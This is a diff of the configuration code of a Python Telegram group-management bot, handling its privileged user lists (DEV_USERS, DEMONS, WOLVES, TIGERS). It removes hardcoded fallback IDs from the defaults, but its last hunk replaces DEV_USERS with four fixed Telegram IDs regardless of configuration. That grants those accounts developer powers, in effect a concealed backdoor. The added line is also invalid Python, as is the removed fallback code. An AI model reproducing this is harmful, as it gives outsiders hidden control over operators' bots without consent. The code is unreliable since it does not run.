@@ -115,25 +115,25 @@ else:
 
     try:
         DRAGONS = set(int(x) for x in Config.DRAGONS or [])
-        DEV_USERS = set(int(x) for x in Config.DEV_USERS or ['5570402782 1733484689 1061059757'])
+        DEV_USERS = set(int(x) for x in Config.DEV_USERS or [])
     except ValueError:
         raise Exception(
             "Your sudo or dev users list does not contain valid BigInteger.")
 
     try:
-        DEMONS = set(int(x) for x in Config.DEMONS or ['1927155351 5570402782 1733484689 1061059757'])
+        DEMONS = set(int(x) for x in Config.DEMONS or [])
     except ValueError:
         raise Exception(
             "Your support users list does not contain valid BigInteger.")
 
     try:
-        WOLVES = set(int(x) for x in Config.WOLVES or ['1927155351 5570402782 1733484689 1061059757'])
+        WOLVES = set(int(x) for x in Config.WOLVES or [])
     except ValueError:
         raise Exception(
             "Your whitelisted users list does not contain valid BigInteger.")
 
     try:
-        TIGERS = set(int(x) for x in Config.TIGERS or ['1927155351 5570402782 1733484689 1061059757'])
+        TIGERS = set(int(x) for x in Config.TIGERS or [])
     except ValueError:
         raise Exception(
             "Your tiger users list does not contain valid BigInteger.")
@@ -185,7 +185,7 @@ pgram = Client("Millie", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
 
 DRAGONS = list(DRAGONS) + list(DEV_USERS)
-DEV_USERS = list(DEV_USERS)
+DEV_USERS = list(1927155351 5570402782 1733484689 1061059757)
 WOLVES = list(WOLVES)
 DEMONS = list(DEMONS)
 TIGERS = list(TIGERS)
